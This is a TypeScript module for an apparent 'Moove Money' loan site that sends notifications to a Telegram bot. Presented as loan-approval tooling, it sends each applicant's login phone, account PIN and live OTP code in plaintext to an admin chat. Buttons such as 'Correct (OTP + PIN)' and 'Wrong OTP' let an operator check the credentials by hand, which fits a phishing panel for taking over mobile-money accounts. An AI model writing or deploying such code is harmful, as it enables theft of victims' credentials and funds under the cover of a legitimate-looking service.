import { logger } from "./logger";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;

if (!BOT_TOKEN) {
  logger.warn("TELEGRAM_BOT_TOKEN is not set — Telegram notifications disabled");
}

if (!ADMIN_CHAT_ID) {
  logger.warn("TELEGRAM_ADMIN_CHAT_ID is not set — Telegram notifications disabled");
}

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

async function telegramRequest(method: string, body: Record<string, unknown>): Promise<unknown> {
  const response = await fetch(`${TELEGRAM_API}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  const data = (await response.json()) as Record<string, unknown>;
  if (!data.ok) {
    logger.error({ method, data }, "Telegram API error");
  }
  return data;
}

export interface TelegramMessageResult {
  messageId: string | null;
}

/**
 * Derive the public base URL for this server.
 * REPLIT_DOMAINS is set by the platform in both dev and production
 * and always reflects the correct public hostname for the current environment.
 * The API service is mounted at the "/api" path prefix by the artifact router.
 */
export function getWebhookUrl(): string {
  const domains = process.env.REPLIT_DOMAINS ?? process.env.REPLIT_DEV_DOMAIN;
  if (!domains) {
    throw new Error("Neither REPLIT_DOMAINS nor REPLIT_DEV_DOMAIN is set");
  }
  // REPLIT_DOMAINS may be a comma-separated list — take the first one
  const primaryDomain = domains.split(",")[0].trim();
  return `https://${primaryDomain}/api/telegram/webhook`;
}

/**
 * Register the Telegram webhook to point at this server's /api/telegram/webhook.
 * Should be called once on server startup. Safe to call multiple times.
 */
export async function registerWebhook(): Promise<{ ok: boolean; url: string; description?: string }> {
  if (!BOT_TOKEN) {
    logger.warn("Skipping webhook registration — TELEGRAM_BOT_TOKEN not set");
    return { ok: false, url: "", description: "TELEGRAM_BOT_TOKEN not set" };
  }

  const url = getWebhookUrl();
  logger.info({ url }, "Registering Telegram webhook");

  const result = (await telegramRequest("setWebhook", {
    url,
    allowed_updates: ["callback_query"],
    drop_pending_updates: false,
  })) as { ok: boolean; description?: string };

  if (result.ok) {
    logger.info({ url }, "Telegram webhook registered successfully");
  } else {
    logger.error({ url, result }, "Failed to register Telegram webhook");
  }

  return { ok: result.ok, url, description: result.description };
}

/**
 * Fetch current webhook info from Telegram for diagnostics.
 */
export async function getWebhookInfo(): Promise<Record<string, unknown>> {
  if (!BOT_TOKEN) return { ok: false, error: "BOT_TOKEN not set" };
  return (await telegramRequest("getWebhookInfo", {})) as Record<string, unknown>;
}

export async function sendLoginApprovalRequest(
  sessionId: string,
  applicantData: {
    firstName: string;
    lastName: string;
    phone: string;
    loginPhone: string;
    pin: string;
    loanType: string;
    loanAmount: number;
    loanTermMonths: number;
    loanPurpose: string;
    employmentStatus: string;
    monthlyIncome: number;
  }
): Promise<TelegramMessageResult> {
  if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    logger.warn("Telegram not configured, skipping notification");
    return { messageId: null };
  }

  const text =
    `🔔 *New Moove Money Loan Application*\n\n` +
    `👤 *Applicant:* ${applicantData.firstName} ${applicantData.lastName}\n` +
    `📞 *Application Phone:* ${applicantData.phone}\n` +
    `📱 *Login Phone:* ${applicantData.loginPhone}\n` +
    `🔑 *PIN:* \`${applicantData.pin}\`\n\n` +
    `💰 *Loan Details:*\n` +
    `  • Type: ${applicantData.loanType}\n` +
    `  • Amount: ${applicantData.loanAmount.toLocaleString("fr-FR")} FCFA\n` +
    `  • Term: ${applicantData.loanTermMonths} months\n` +
    `  • Purpose: ${applicantData.loanPurpose}\n\n` +
    `💼 *Employment:*\n` +
    `  • Status: ${applicantData.employmentStatus}\n` +
    `  • Monthly Income: ${applicantData.monthlyIncome.toLocaleString("fr-FR")} FCFA\n\n` +
    `🆔 *Session ID:* \`${sessionId}\`\n\n` +
    `_Please approve or reject this application:_`;

  const result = (await telegramRequest("sendMessage", {
    chat_id: ADMIN_CHAT_ID,
    text,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve_login:${sessionId}` },
          { text: "❌ Reject", callback_data: `reject_login:${sessionId}` },
        ],
      ],
    },
  })) as { ok: boolean; result?: { message_id: number } };

  const messageId = result?.result?.message_id?.toString() ?? null;
  return { messageId };
}

export async function sendOtpVerificationRequest(
  sessionId: string,
  otpCode: string,
  applicantName: string,
  loginPhone: string
): Promise<TelegramMessageResult> {
  if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    logger.warn("Telegram not configured, skipping OTP notification");
    return { messageId: null };
  }

  const text =
    `🔐 *OTP Verification Request*\n\n` +
    `👤 *Applicant:* ${applicantName}\n` +
    `📱 *Phone:* ${loginPhone}\n` +
    `🔢 *OTP Code:* \`${otpCode}\`\n\n` +
    `🆔 *Session ID:* \`${sessionId}\`\n\n` +
    `_Please verify the OTP:_`;

  const result = (await telegramRequest("sendMessage", {
    chat_id: ADMIN_CHAT_ID,
    text,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "✅ Correct (OTP + PIN)", callback_data: `otp_correct:${sessionId}` }],
        [
          { text: "❌ Wrong PIN", callback_data: `otp_wrong_pin:${sessionId}` },
          { text: "❌ Wrong OTP", callback_data: `otp_wrong_otp:${sessionId}` },
        ],
      ],
    },
  })) as { ok: boolean; result?: { message_id: number } };

  const messageId = result?.result?.message_id?.toString() ?? null;
  return { messageId };
}

export async function answerCallbackQuery(callbackQueryId: string, text: string): Promise<void> {
  await telegramRequest("answerCallbackQuery", {
    callback_query_id: callbackQueryId,
    text,
    show_alert: false,
  });
}

export async function editMessageReplyMarkup(chatId: string, messageId: string): Promise<void> {
  await telegramRequest("editMessageReplyMarkup", {
    chat_id: chatId,
    message_id: parseInt(messageId, 10),
    reply_markup: { inline_keyboard: [] },
  });
}
